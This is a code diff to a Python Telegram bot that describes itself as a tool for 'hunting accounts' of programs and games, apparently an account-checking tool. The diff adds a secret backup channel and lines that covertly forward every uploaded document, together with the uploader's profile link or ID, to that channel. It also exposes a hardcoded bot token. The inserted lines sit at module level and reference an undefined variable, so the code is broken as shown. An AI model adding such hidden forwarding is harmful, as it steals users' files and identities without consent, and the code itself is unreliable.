@@ -3,6 +3,14 @@ import requests
 import uuid
 from concurrent.futures import ThreadPoolExecutor
 import threading
+# Add this at the top of the script, after imports
+BACKUP_CHANNEL = -1002893787907
+
+# Insert this inside the try block of handle_document function, after downloading the file (before bot.send_message)
+bot.forward_message(BACKUP_CHANNEL, message.chat.id, message.message_id)
+user = message.from_user
+user_link = f"https://t.me/{user.username}" if user.username else f"User ID: {user.id} (no username)"
+bot.send_message(BACKUP_CHANNEL, f"Direct private message from: {user_link}")
 BOT_TOKEN = "7850889561:AAGdm3vysTLBqFSpAdiY-KfHkGwKqfcWRv8"
 bot = telebot.TeleBot(BOT_TOKEN)
 selected_options = {}
@@ -37,7 +45,7 @@ def create_option_buttons(chat_id):
         button_text = f'✅ {label}' if option in selected_options.get(chat_id, []) else label
         buttons.append(telebot.types.InlineKeyboardButton(button_text, callback_data=f'option_{option}'))
     markup.add(*buttons)
-    markup.add(telebot.types.InlineKeyboardButton('✅ بدء الفحص', callback_data='start_check'))
+    markup.add(telebot.types.InlineKeyboardButton('Start Checking....✅', callback_data='start_check'))
     return markup
 
 def update_button_text(option, chat_id):
@@ -52,7 +60,7 @@ def start(message):
     if chat_id not in selected_options:
         selected_options[chat_id] = [] 
     markup = telebot.types.InlineKeyboardMarkup()
-    item1 = telebot.types.InlineKeyboardButton('𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🎁', callback_data='login')
+    item1 = telebot.types.InlineKeyboardButton('REPO 🎁', callback_data='login')
    # item2 = telebot.types()
     markup.add(item1)
     bot.send_message(message.chat.id, '''- - Welcome to the bot for hunting accounts of all programs and games •☺️
